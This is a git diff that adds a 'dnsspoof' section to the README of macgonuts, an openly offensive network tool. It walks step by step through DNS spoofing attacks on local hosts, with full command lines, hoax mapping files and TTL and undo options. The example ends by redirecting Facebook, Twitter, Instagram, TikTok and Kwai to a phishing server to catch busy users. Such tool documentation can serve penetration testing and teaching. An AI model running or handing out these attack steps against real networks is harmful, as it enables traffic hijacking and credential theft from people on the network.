@@ -13,6 +13,7 @@
     - [The eavesdrop command](#the-eavesdrop-command)
     - [The isolate command](#the-isolate-command)
     - [The mayhem command](#the-mayhem-command)
+    - [The dnsspoof command](#the-dnsspoof-command)
 
 ## What does ``macgonuts`` is for?
 
@@ -381,5 +382,150 @@ will make the whole network nodes potential targets.
 
 Congrats! Now you are a layer-2 disorder master by knowing every single detail about
 ``macgonuts mayhem`` command, bad cat!
+
+[``Back``](#topics)
+
+### The dnsspoof command
+
+> If you are finding a way of redirecting some host to another by making this host accept fake name resolutions, dnsspoof
+is your command of choice...
+
+Let's take a look at ``dnsspoof`` quick help:
+
+```
+ulisses@cave:~# macgonuts help dnsspoof
+use: macgonuts dnsspoof --lo-iface=<label> --target-addrs=<ip4|ip6 list>
+                       [--etc-hoax=<filepath> --hoax-ttl=<secs> --dns-addrs=<ip4|ip6 list>
+                        --undo-spoof]
+```
+
+Well, by default ``dnsspoof`` command expects at least two options:
+
+- ``lo-iface``
+- ``target-addrs``
+
+Being ``lo-iface`` option the name of your network interface card that you will use during the ``DNS spoof attack`` and,
+the ``target-addrs`` is just about a ip addresses listing that will be the potential targets of this attack.
+
+The core of ``dnsspoof`` command is a special file called (drum roll, one more pun) `/etc/hoax`. It is similar to
+your nearest ``/etc/hosts`` file. By default ``macgonuts`` will install a copy of it but you need to tune it up
+according to your interests (the default installation path is ``/usr/local/share/macgonuts/etc/hoax``).
+When you do not make the location of the ``/etc/hoax`` explicit by using ``etc-hoax`` option, ``macgonuts``
+will try to use the installed default one.
+
+The syntax of a ``/etc/hoax`` is as follows:
+
+```
+# IPv6 or IPv4 address          FQDN or a glob based on a FQDN, btw, this is a commentary! ;)
+
+2001:db8:0:f101::2              faketory.fakebook.com
+2001:db8:0:f101::3              *.fakebook.com
+8.8.8.8                         *.fakebook.com
+```
+
+As you see, it is quite similar to ``/etc/hosts``. The ``dnssppof`` command will use the address mappings present
+in passed ``/etc/hoax`` to base all DNS resolutions that will deceive the attacking victims.
+
+Now, story time!!!!!!
+
+Once upon time, three users in a local network environment: ``ulisses``, ``polifemo`` and ``ninguém``.
+
+Facts about the network configuration:
+
+- ``Ulisses``'s address is ``192.168.5.111`` and his host name at the local network is ``ulisses.lo``
+- ``Polifemo``'s address is ``192.168.5.142`` and his host name at the local network is ``polifemo.lo``
+-  ``Ninguém``'s address is ``192.168.5.171`` and his host name at the local network is ``ninguem.lo``
+- The gateway address is ``192.168.5.1``.
+
+``Ulisses`` knows that ``Polifemo`` is always seeking to troll him host at this local network. So ``Ulisses`` want to
+make ``Polifemo`` thinks that he is ``Ninguém``. Well, since everyone access the computer of the others by using names
+instead of raw IPs, ``Ulisses`` decided to use ``macgonuts dnsspoof``.
+
+So ``Ulisses`` tuned up the following ``/etc/hoax``:
+
+```
+192.168.5.171           ulisses.lo
+```
+
+He saved it as ``/tmp/i_am_ninguem`` and executed ``macgonuts`` as follows:
+
+```
+ulisses@cave:~# macgonuts dnsspooof --lo-iface=eth0 --target-addrs=192.168.5.142 \
+> --etc-hoax=/tmp/i_am_ninguem
+```
+
+All done! From now on any ``DNS`` query sent by ``Polifemo`` trying to discover where ``ulisses.lo`` are will
+be replied with a fake resolution telling that ``ulisses.lo`` is at ``192.168.5.171`` (``ninguem.lo``).
+
+But the resolutions will last only ``1s``, if he want that it lasts more he can use ``hoax-ttl`` option
+by indicating the duration in seconds:
+
+```
+ulisses@cave:~# macgonuts dnsspooof --lo-iface=eth0 --target-addrs=192.168.5.142 \
+> --etc-hoax=/tmp/i_am_ninguem --hoax-ttl=3600
+```
+
+Now the resolutions should last for 1 hour in ``Polifemo``'s dns cache.
+
+Anyway, ``Polifemo`` has some friends in this network that should annoy ``Ulisses``, too. In this way, ``Ulisses``
+only have to indicate the ip addresss of each:
+
+```
+ulisses@cave:~# macgonuts dnsspooof --lo-iface=eth0 \
+> --target-addrs=192.168.5.142,192.168.5.143,192.168.5.144,192.168.5.145 \
+> --etc-hoax=/tmp/i_am_ninguem --hoax-ttl=3600
+```
+
+Now the hosts from ``192.168.142`` to ``192.168.145`` when trying to reach ``Ulisses`` by his
+host name will reach ``Ninguém``.
+
+But ``Ulisses`` is smart and do not want to warn them of his ``FQDN escape``. Supposing that ``ulisses.lo``
+goes off it does not necessarily will do ``ninguem.lo`` goes off and, it could alarm ``Polifemo`` and his not
+so clever gang... Trying to make his fakery more perfect, ``Ulisses`` uses ``undo-spoof`` option:
+
+```
+ulisses@cave:~# macgonuts dnsspooof --lo-iface=eth0 \
+> --target-addrs=192.168.5.142,192.168.5.143,192.168.5.144,192.168.5.145 \
+> --etc-hoax=/tmp/i_am_ninguem --hoax-ttl=3600 --undo-spoof
+```
+
+Now when ``Ulisses`` exits ``macgonuts``, it will undo all spoofing dance done under the hood.
+
+Let's suppose that ``Ulisses`` now also want to ``hack`` ``Polifemo`` and his gang with some
+``phising attack``. Knowing that ``Polifemo`` and folks are really busy people, Ulisses prepared some
+meaningful fake web pages at ``192.168.5.101`` and updated his ``/tmp/i_am_ninguem`` to:
+
+```
+192.168.5.171           ulisses.lo
+# Busy people...
+192.168.5.101           *.facebook.com
+192.168.5.101           *.twitter.com
+192.168.5.101           *.instagram.com
+192.168.5.101           *.tiktok.com
+192.168.5.101           *.kwai.com
+```
+
+Now supposing that this network start using a internal ``DNS`` at ``192.168.5.8``. All ``Ulisses`` must do
+is indicate the internal ``DNS`` address in ``dns-addrs`` list:
+
+```
+ulisses@cave:~# macgonuts dnsspooof --lo-iface=eth0 \
+> --target-addrs=192.168.5.142,192.168.5.143,192.168.5.144,192.168.5.145 \
+> --dns-addrs=192.168.5.8 \
+> --etc-hoax=/tmp/i_am_ninguem --hoax-ttl=3600 --undo-spoof
+
+```
+
+By the way, it will make the attack easier to promote. The ``dns-addrs`` option is also useful when you want
+to spoof ``DNS`` replies that come from a specify ``DNS`` server (even external).
+
+Did you see as easy is promote a ``DNS`` spoof attack with ``macgonuts``? You do not need to pile up ``n`` tools,
+emit ``OS`` commands to your network stack etc. You should just inform the context of your attack e tchum...
+
+``dnsspoof`` was a reborn of ``dnsf_ckr``. A tool of mine that I wrote some years ago but it had a lot of
+"operational gaps". This reborn works as I wanted since that time and it still supports ``IPv6`` environments! :metal:
+
+Congrats! Now you are a master of ``FQDN`` forgery and falsehoods with ``macgonuts dnsspoof`` command! ``Geppetto`` is
+proud of you ``Pinocchio``! Use it with care.
 
 [``Back``](#topics)
